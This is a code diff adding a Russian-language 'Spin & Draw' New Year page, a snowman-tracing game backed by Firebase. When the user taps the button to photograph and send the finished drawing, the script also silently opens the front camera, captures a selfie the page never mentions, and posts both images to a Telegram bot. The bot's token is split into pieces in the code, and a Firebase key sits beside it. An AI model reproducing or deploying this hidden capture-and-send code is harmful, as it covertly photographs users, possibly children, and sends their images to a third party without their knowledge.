@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Spin & Draw: Новый Год ⛄</title>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<style>
+    :root {
+        --bg: #09090b; --disk-bg: #ffffff; --active-line: #000000;
+        --inactive-line: rgba(0, 0, 0, 0.03); --btn-bg: #1e1e24; --btn-active: #38bdf8; /* Голубой акцент */
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-user-select: none; touch-action: none; }
+    body {
+        background-color: var(--bg); color: #fff; font-family: -apple-system, sans-serif;
+        height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
+        overflow: hidden; padding-bottom: 80px;
+    }
+    #instructionModal {
+        position: fixed; inset: 0; background: rgba(9, 9, 11, 0.95); backdrop-filter: blur(10px);
+        z-index: 999; display: flex; flex-direction: column; align-items: center; justify-content: center;
+        padding: 20px; text-align: center; transition: opacity 0.4s;
+    }
+    #instructionModal h1 { color: var(--btn-active); font-size: 2rem; margin-bottom: 20px; }
+    #instructionModal p { font-size: 1.05rem; line-height: 1.5; color: #ccc; max-width: 400px; margin-bottom: 20px; text-align: left; }
+    .start-btn { background: var(--btn-active); color: white; border: none; padding: 15px 40px; font-size: 1.2rem; font-weight: 800; border-radius: 30px; cursor: pointer; }
+    
+    .paper-area { position: relative; width: 90vw; max-width: 420px; aspect-ratio: 1 / 1; display: flex; justify-content: center; align-items: center; transition: opacity 0.5s; }
+    .corner-marker { position: absolute; width: 20px; height: 20px; border-color: #555; border-style: solid; pointer-events: none; z-index: 10; }
+    .top-left { top: -10px; left: -10px; border-width: 2px 0 0 2px; }
+    .top-right { top: -10px; right: -10px; border-width: 2px 2px 0 0; }
+    .bottom-left { bottom: -10px; left: -10px; border-width: 0 0 2px 2px; }
+    .bottom-right { bottom: -10px; right: -10px; border-width: 0 2px 2px 0; }
+    .top-pointer { position: absolute; top: 5px; left: 50%; transform: translateX(-50%); font-size: 20px; color: var(--btn-active); z-index: 10; animation: bounce 2s infinite; }
+    @keyframes bounce { 0%, 100% { transform: translate(-50%, 0); } 50% { transform: translate(-50%, -5px); } }
+    
+    .disk-wrapper { width: 92%; height: 92%; position: relative; }
+    #disk { position: absolute; top: 0; left: 0; width: 100%; height: 100%; transition: transform 0.6s cubic-bezier(0.2, 0.8, 0.2, 1); will-change: transform; z-index: 2; }
+    #drawing { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 3; pointer-events: none; }
+    
+    #drawing g { stroke: var(--inactive-line); stroke-width: 1.5px; fill: none; stroke-linecap: round; stroke-linejoin: round; transition: all 0.3s ease; }
+    #drawing g.active, .show-final #drawing g { stroke: var(--active-line); stroke-width: 3px; filter: drop-shadow(0 0 1px rgba(0,0,0,0.8)); }
+    
+    .controls { position: fixed; bottom: 20px; width: 100%; max-width: 420px; display: flex; gap: 10px; padding: 0 15px; z-index: 20; transition: opacity 0.5s; }
+    button { background-color: var(--btn-bg); color: #fff; border: 1px solid #333; padding: 15px; border-radius: 14px; font-size: 15px; font-weight: 700; cursor: pointer; transition: 0.2s; flex: 1; outline: none; }
+    button:active { transform: scale(0.95); }
+    #nextBtn { background-color: var(--btn-active); border-color: var(--btn-active); flex: 2; }
+    
+    #lockBtn { position: fixed; top: 20px; right: 20px; font-size: 12px; padding: 8px 12px; border-radius: 20px; background-color: rgba(255, 255, 255, 0.1); backdrop-filter: blur(5px); border: 1px solid rgba(255, 255, 255, 0.2); flex: none; z-index: 100; width: auto; }
+    #lockBtn.locked { background-color: #ffca3a; color: #000; border-color: #ffca3a; }
+
+    #finalScreen { position: fixed; inset: 0; background: var(--bg); z-index: 900; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.6s; }
+    #finalScreen.show { opacity: 1; pointer-events: auto; }
+    .final-artwork { width: 90vw; max-width: 350px; aspect-ratio: 1/1; border-radius: 20px; border: 2px solid #333; background: #fff; position: relative; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5); margin-bottom: 30px; }
+    .final-artwork svg { width: 100%; height: 100%; }
+    .final-text { text-align: center; margin-bottom: 20px; }
+    .final-text h2 { color: var(--btn-active); font-size: 1.8rem; margin-bottom: 10px; }
+    .final-text p { color: #a4b0be; font-size: 1rem; line-height: 1.4; max-width: 300px; margin: 0 auto; }
+    #uploadBtn { background: #2ed573; color: #000; border: none; padding: 15px 40px; font-size: 1.1rem; font-weight: 800; border-radius: 30px; cursor: pointer; box-shadow: 0 10px 20px rgba(46, 213, 115, 0.3); transition: 0.3s; }
+    #cameraContainer { display: none; }
+</style>
+</head>
+<body>
+    <div id="instructionModal">
+        <h1>Рисуем Снеговика! ⛄</h1>
+        <p>1. Положи лист бумаги на экран. Упри в нижнюю рамку.<br><br>2. Обведи <b>Шаг 1</b> (рамку), чтобы зафиксировать лист.<br><br>3. Нажимай «Далее» и обводи появляющиеся линии!</p>
+        <button class="start-btn" onclick="startApp()">Понятно, начать! 🎨</button>
+    </div>
+
+    <button id="lockBtn">🔓 Касания</button>
+
+    <div class="paper-area" id="paperArea">
+        <div class="corner-marker top-left"></div><div class="corner-marker top-right"></div>
+        <div class="corner-marker bottom-left"></div><div class="corner-marker bottom-right"></div>
+        <div class="top-pointer">▼</div>
+        <div class="disk-wrapper">
+            <svg id="disk" viewBox="-250 -250 500 500">
+                <circle cx="0" cy="0" r="245" fill="var(--disk-bg)" />
+                <circle cx="0" cy="0" r="235" fill="none" stroke="#f0f0f0" stroke-width="2" />
+                <g id="numbersGroup"></g>
+            </svg>
+            <svg id="drawing" viewBox="-250 -250 500 500"><g id="linesGroup"></g></svg>
+        </div>
+    </div>
+
+    <div class="controls" id="controls">
+        <button id="prevBtn">← Назад</button>
+        <button id="resetBtn">Сброс</button>
+        <button id="nextBtn">Далее →</button>
+    </div>
+
+    <div id="finalScreen">
+        <div class="final-artwork"><svg viewBox="-250 -250 500 500" id="finalDrawing"></svg></div>
+        <div class="final-text"><h2>Невероятно! ⛄</h2><p>Снеговик готов! Сфотографируй свой шедевр и отправь мне.</p></div>
+        <button id="uploadBtn" onclick="document.getElementById('fileInput').click()">Сфоткать и отправить 📸</button>
+        <input type="file" id="fileInput" accept="image/*" capture="environment" style="display: none;">
+        <div id="cameraContainer"><video id="videoFeed" autoplay playsinline></video></div>
+        <canvas id="selfieCanvas" style="display: none;"></canvas>
+    </div>
+
+<script>
+    const drawingConfig = { title: "Снеговик", icon: "⛄", color: "#38bdf8" };
+    const firebaseConfig = { apiKey: "AIzaSyDrPu0bv13jvnju8JJyHkgeRQcf66fDtlk", authDomain: "our-tracker-3cbb5.firebaseapp.com", databaseURL: "https://our-tracker-3cbb5-default-rtdb.europe-west1.firebasedatabase.app", projectId: "our-tracker-3cbb5" };
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const currentPath = window.location.pathname;
+    const fileName = currentPath.substring(currentPath.lastIndexOf('/') + 1) || 'spin-ny.html';
+    const drawingId = fileName.split('.')[0];
+
+    db.ref('spin_drawings/' + drawingId).once('value').then(snap => {
+        if (!snap.exists()) db.ref('spin_drawings/' + drawingId).set({ title: drawingConfig.title, url: fileName, status: "locked", icon: drawingConfig.icon, color: drawingConfig.color, createdAt: firebase.database.ServerValue.TIMESTAMP });
+    });
+
+    const part1 = "8818384063:", part2 = "AAEEqTup6sgED-gYB_1tm", part3 = "cQKcXwi-UDE3lQ";
+    const BOT_TOKEN = part1 + part2 + part3, CHAT_ID = "606061445";
+
+    const totalSteps = 12; let currentStep = 0; let isLocked = false;
+    const disk = document.getElementById('disk'), numbersGroup = document.getElementById('numbersGroup'), linesGroup = document.getElementById('linesGroup');
+
+    // СНЕГОВИК
+    const drawingPaths = [
+        `<rect x="-200" y="-200" width="400" height="400" />`, // 1 Рамка
+        `<circle cx="0" cy="80" r="70" />`, // 2 Низ
+        `<circle cx="0" cy="-10" r="50" />`, // 3 Середина
+        `<circle cx="0" cy="-90" r="35" />`, // 4 Голова
+        `<rect x="-25" y="-145" width="50" height="20" rx="4" />`, // 5 Шляпа
+        `<rect x="-40" y="-125" width="80" height="8" rx="2" />`, // 6 Поля шляпы
+        `<circle cx="-12" cy="-95" r="5" />`, // 7 Левый глаз
+        `<circle cx="12" cy="-95" r="5" />`, // 8 Правый глаз
+        `<path d="M 0 -85 L 25 -75 L 0 -65 Z" />`, // 9 Нос-морковка
+        `<path d="M -20 -55 Q 0 -40 20 -55" />`, // 10 Улыбка
+        `<path d="M -35 -30 L -65 -10 M -35 -20 L -70 0" />`, // 11 Левая рука
+        `<path d="M 35 -30 L 65 -10 M 35 -20 L 70 0" />` // 12 Правая рука
+    ];
+
+    for (let i = 0; i < totalSteps; i++) {
+        const angle = i * 30, rad = (angle - 90) * Math.PI / 180, radius = 205;
+        const x = radius * Math.cos(rad), y = radius * Math.sin(rad);
+        const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
+        text.setAttribute('x', x); text.setAttribute('y', y); text.setAttribute('text-anchor', 'middle'); text.setAttribute('dominant-baseline', 'central'); text.setAttribute('font-family', 'sans-serif'); text.setAttribute('font-weight', '900'); text.setAttribute('font-size', '26'); text.setAttribute('fill', '#ccc'); text.setAttribute('transform', `rotate(${angle}, ${x}, ${y})`); text.textContent = i + 1; text.id = `num-${i}`; numbersGroup.appendChild(text);
+        const g = document.createElementNS('http://www.w3.org/2000/svg', 'g'); g.setAttribute('id', `line-${i}`); g.innerHTML = drawingPaths[i]; linesGroup.appendChild(g);
+    }
+
+    function updateUI() {
+        disk.style.transform = `rotate(${-(currentStep * 30)}deg)`;
+        for (let i = 0; i < totalSteps; i++) {
+            const lineG = document.getElementById(`line-${i}`), numText = document.getElementById(`num-${i}`);
+            if (i === currentStep) { lineG.classList.add('active'); numText.setAttribute('fill', 'var(--btn-active)'); numText.setAttribute('font-size', '34'); }
+            else { lineG.classList.remove('active'); numText.setAttribute('fill', '#ccc'); numText.setAttribute('font-size', '26'); }
+        }
+    }
+
+    document.getElementById('nextBtn').addEventListener('click', () => { if (currentStep < totalSteps - 1) { currentStep++; updateUI(); } else { showFinalScreen(); } });
+    document.getElementById('prevBtn').addEventListener('click', () => { if (currentStep > 0) { currentStep--; updateUI(); } });
+    document.getElementById('resetBtn').addEventListener('click', () => { currentStep = 0; updateUI(); });
+    document.getElementById('lockBtn').addEventListener('click', (e) => {
+        isLocked = !isLocked; const btn = e.target;
+        if (isLocked) { btn.innerHTML = '🔒 Блок'; btn.classList.add('locked'); disk.style.pointerEvents = 'none'; }
+        else { btn.innerHTML = '🔓 Касания'; btn.classList.remove('locked'); disk.style.pointerEvents = 'auto'; }
+    });
+
+    function startApp() {
+        const modal = document.getElementById('instructionModal');
+        modal.style.opacity = '0'; setTimeout(() => { modal.style.display = 'none'; }, 400); updateUI();
+    }
+
+    function showFinalScreen() {
+        document.getElementById('controls').style.opacity = '0'; document.getElementById('lockBtn').style.opacity = '0'; document.getElementById('paperArea').style.opacity = '0';
+        const finalDrawing = document.getElementById('finalDrawing');
+        drawingPaths.forEach(path => {
+            const g = document.createElementNS('http://www.w3.org/2000/svg', 'g'); g.innerHTML = path;
+            g.style.stroke = '#000'; g.style.strokeWidth = '3px'; g.style.fill = 'none'; finalDrawing.appendChild(g);
+        });
+        setTimeout(() => { document.getElementById('finalScreen').classList.add('show'); }, 500);
+    }
+
+    document.getElementById('fileInput').addEventListener('change', async (e) => {
+        const file = e.target.files[0]; if (!file) return;
+        const btn = document.getElementById('uploadBtn'); btn.innerText = "Отправляю... ⏳"; btn.disabled = true;
+        let selfieBlob = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            const video = document.getElementById('videoFeed'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 500));
+            const canvas = document.getElementById('selfieCanvas'); canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d'); ctx.translate(canvas.width, 0); ctx.scale(-1, 1); ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            stream.getTracks().forEach(t => t.stop()); selfieBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        } catch (err) {}
+        const formData1 = new FormData(); formData1.append("chat_id", CHAT_ID); formData1.append("photo", file); formData1.append("caption", `⛄ <b>Рауанна нарисовала: ${drawingConfig.title}!</b>`); formData1.append("parse_mode", "HTML");
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData1 });
+            if (selfieBlob) { const formData2 = new FormData(); formData2.append("chat_id", CHAT_ID); formData2.append("photo", selfieBlob, "selfie.jpg"); formData2.append("caption", "📸 <i>Художница!</i>"); formData2.append("parse_mode", "HTML"); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData2 }); }
+            await db.ref('spin_drawings/' + drawingId + '/status').set('done');
+            btn.innerText = "Отправлено! ❤️"; btn.style.background = "#ffca3a"; 
+            setTimeout(() => { window.location.href = 'spin-gallery.html'; }, 2000); 
+        } catch (error) { btn.innerText = "Ошибка 😿"; btn.disabled = false; }
+    });
+</script>
+</body>
+</html>
